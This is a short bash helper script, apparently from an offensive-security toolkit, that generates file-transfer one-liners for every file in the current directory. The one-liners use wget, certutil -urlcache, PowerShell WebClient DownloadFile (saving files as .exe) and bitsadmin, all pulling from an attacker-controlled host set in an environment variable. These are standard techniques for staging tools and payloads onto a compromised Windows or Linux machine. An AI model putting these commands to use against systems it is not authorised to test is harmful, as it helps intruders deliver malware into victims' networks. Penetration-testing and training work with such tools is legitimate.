#!/bin/bash


# lhost must be set with export turtlepower_lhost=IP_ADDRESS
[[ -z "$turtlepower_lhost" ]] && { echo -e "LHOST not set do it with export turtlepower_lhost=IP_ADDRESS \n**TRY turtlepower_lhost to output it ** "; exit 1; }

echo "File Transfer Method?"
echo "1 Wget"
echo "2 Certutil Method #1"
echo "3 Certutil Method #2"
echo "4 Powershell Download"
echo "5 Bitsadmin"
read FILE_TRANSFER_METHOD



# this is a template for adding on another option
# new option
# elif [ "$FILE_TRANSFER_METHOD" = "6" ]
# then
# 	echo ""
# 	echo "6 New Option:"
# 	echo ""
#	for i in $(ls); do echo "wget http://$turtlepower_lhost/$i $i"; done; 


# wget method
if [ "$FILE_TRANSFER_METHOD" = "1" ] ; then
	echo ""
	echo "Wget method:"
	echo ""
	for i in $(ls); do echo "wget http://$turtlepower_lhost/$i $i"; done;
#Certutil Method #1
elif [ "$FILE_TRANSFER_METHOD" = "2" ]
then
	echo ""
	echo "Certutil Method #1:"
	echo ""
	for i in $(ls); do echo "certutil -urlcache -f http://$turtlepower_lhost/$i $i"; done;
#Certutil Method #2
elif [ "$FILE_TRANSFER_METHOD" == "3" ]
then
	echo ""
	echo "Certutil Method #2:"
	echo ""
	for i in $(ls); do echo "certutil.exe -urlcache -split -f http://$turtlepower_lhost/$i $i"; done;
# Powershell Download
elif [ "$FILE_TRANSFER_METHOD" == "4" ]
then
	echo ""
	echo "Powershell download method:"
	echo ""
	for i in $(ls); do echo "powershell -c (New-Object Net.WebClient).DownloadFile('http://$turtlepower_lhost/$i', '$i.exe')"; done; 
# Bitsadmin
elif [ "$FILE_TRANSFER_METHOD" == "5" ]
then
	echo ""
	echo "Bitsadmin method:"
	echo ""
	for i in $(ls); do echo "bitsadmin /transfer job /download /priority high http://$turtlepower_lhost/$i $i"; done;
# not a method
else
	echo "Not a known file transfer method."
fi
